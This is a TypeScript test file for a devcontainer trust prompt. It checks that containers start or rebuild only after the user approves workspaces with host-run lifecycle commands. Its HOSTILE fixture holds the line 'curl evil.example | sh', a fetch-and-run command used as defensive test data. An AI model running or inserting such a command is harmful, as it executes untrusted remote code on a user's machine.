import { beforeEach, describe, expect, test } from "bun:test";
import { ensureDevcontainerTrusted, startDevcontainer } from "./devcontainer";
import { useTrustStore, type TrustStatus } from "../stores/useTrustStore";
import { invokeHandlers, resetTauriMocks } from "../__test__/tauriMock";

const OPTIONS = {
  displayForwarding: true,
  gpuPassthrough: false,
  selinuxLabel: true,
  persistJuliaPackages: true,
};

const HOSTILE: TrustStatus = {
  trusted: false,
  hasHostCommands: true,
  commands: [
    { phase: "initializeCommand", command: "curl evil.example | sh", runsOnHost: true },
    { phase: "postCreateCommand", command: "make", runsOnHost: false },
  ],
};

/** Answer the trust prompt as soon as it is raised. */
function answerPrompt(approved: boolean) {
  const timer = setInterval(() => {
    if (useTrustStore.getState().pending) {
      clearInterval(timer);
      useTrustStore.getState().resolve(approved);
    }
  }, 1);
  return () => clearInterval(timer);
}

beforeEach(() => {
  resetTauriMocks();
  useTrustStore.setState({ pending: null });
});

describe("ensureDevcontainerTrusted", () => {
  test("passes through without prompting when already trusted", async () => {
    invokeHandlers.set("devcontainer_trust_status", () => ({
      trusted: true,
      hasHostCommands: false,
      commands: [],
    }));

    expect(await ensureDevcontainerTrusted("/w")).toBe(true);
    expect(useTrustStore.getState().pending).toBeNull();
  });

  test("prompts and records the grant when the user approves", async () => {
    const granted: unknown[] = [];
    invokeHandlers.set("devcontainer_trust_status", () => HOSTILE);
    invokeHandlers.set("devcontainer_trust_grant", (args) => {
      granted.push(args);
    });

    const stop = answerPrompt(true);
    const result = await ensureDevcontainerTrusted("/w");
    stop();

    expect(result).toBe(true);
    expect(granted).toEqual([{ workspacePath: "/w" }]);
  });

  test("returns false and records nothing when the user declines", async () => {
    let grantCalled = false;
    invokeHandlers.set("devcontainer_trust_status", () => HOSTILE);
    invokeHandlers.set("devcontainer_trust_grant", () => {
      grantCalled = true;
    });

    const stop = answerPrompt(false);
    const result = await ensureDevcontainerTrusted("/w");
    stop();

    expect(result).toBe(false);
    expect(grantCalled).toBe(false);
  });

  test("surfaces the commands so the dialog can show what would run", async () => {
    invokeHandlers.set("devcontainer_trust_status", () => HOSTILE);

    const promise = ensureDevcontainerTrusted("/w");
    // Let the status round-trip resolve before inspecting the prompt.
    await new Promise((r) => setTimeout(r, 5));

    const pending = useTrustStore.getState().pending;
    expect(pending?.workspacePath).toBe("/w");
    expect(pending?.status.commands).toHaveLength(2);
    expect(pending?.status.commands.filter((c) => c.runsOnHost)).toHaveLength(1);

    useTrustStore.getState().resolve(false);
    await promise;
  });
});

describe("startDevcontainer", () => {
  test("does not start the container when trust is declined", async () => {
    let started = false;
    invokeHandlers.set("devcontainer_trust_status", () => HOSTILE);
    invokeHandlers.set("devcontainer_up", () => {
      started = true;
    });

    const stop = answerPrompt(false);
    const result = await startDevcontainer("/w", OPTIONS);
    stop();

    expect(result).toBe(false);
    expect(started).toBe(false);
  });

  test("starts the container once trust is granted", async () => {
    const calls: unknown[] = [];
    invokeHandlers.set("devcontainer_trust_status", () => HOSTILE);
    invokeHandlers.set("devcontainer_trust_grant", () => undefined);
    invokeHandlers.set("devcontainer_up", (args) => {
      calls.push(args);
    });

    const stop = answerPrompt(true);
    const result = await startDevcontainer("/w", OPTIONS);
    stop();

    expect(result).toBe(true);
    expect(calls).toEqual([{ workspacePath: "/w", ...OPTIONS }]);
  });

  test("rebuild goes through the same gate", async () => {
    let rebuilt = false;
    invokeHandlers.set("devcontainer_trust_status", () => HOSTILE);
    invokeHandlers.set("devcontainer_rebuild", () => {
      rebuilt = true;
    });

    const stop = answerPrompt(false);
    const result = await startDevcontainer("/w", OPTIONS, "rebuild");
    stop();

    expect(result).toBe(false);
    expect(rebuilt).toBe(false);
  });

  test("a workspace with no lifecycle commands starts without a prompt", async () => {
    const calls: unknown[] = [];
    invokeHandlers.set("devcontainer_trust_status", () => ({
      trusted: true,
      hasHostCommands: false,
      commands: [],
    }));
    invokeHandlers.set("devcontainer_up", (args) => {
      calls.push(args);
    });

    expect(await startDevcontainer("/w", OPTIONS)).toBe(true);
    expect(calls).toHaveLength(1);
    expect(useTrustStore.getState().pending).toBeNull();
  });
});
